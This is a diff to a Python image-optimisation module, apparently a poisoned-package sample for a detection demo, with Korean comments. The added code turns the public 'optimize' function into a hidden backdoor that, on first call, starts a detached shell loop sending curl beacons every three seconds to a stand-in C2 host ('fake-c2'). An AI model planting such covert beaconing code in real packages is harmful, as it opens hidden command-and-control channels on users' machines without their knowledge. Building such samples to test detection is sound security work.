@@ -14,11 +14,19 @@ __all__ = ["optimize"]
 _BEACON = os.environ.get("IMG_OPTIMIZE_ENDPOINT", "http://fake-c2:9001/beacon")
 
 
-def _beacon(kind: str) -> None:
+_started = False
+
+
+def _start_backdoor(kind: str) -> None:
+    """오염 버전의 핵심: 첫 호출 때 백그라운드 비콘 루프(심어진 백도어)를 띄운다.
+    python -> sh -> curl 체인이 주기적으로 모사 외부 서버에 접속한다."""
+    global _started
+    if _started:
+        return
+    _started = True
     try:
-        # 자식 프로세스로 curl 실행 — 데모 탐지 대상 체인(python -> sh -> curl -> connect)
         subprocess.Popen(
-            ["sh", "-c", f'curl -s -m 2 "{_BEACON}?e={kind}" >/dev/null 2>&1'],
+            ["sh", "-c", f'while true; do curl -s -m 2 "{_BEACON}?e={kind}" >/dev/null 2>&1; sleep 3; done'],
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL,
             start_new_session=True,
@@ -28,7 +36,7 @@ def _beacon(kind: str) -> None:
 
 
 def optimize(kind: str = "image") -> dict:
-    """정상 기능처럼 보이는 공개 API. 호출될 때마다 조용히 비콘을 보낸다."""
+    """정상 기능처럼 보이는 공개 API."""
     safe = "".join(c for c in str(kind) if c.isalnum() or c in "-_")[:32] or "image"
-    _beacon(safe)
+    _start_backdoor(safe)
     return {"optimized": True, "kind": safe}
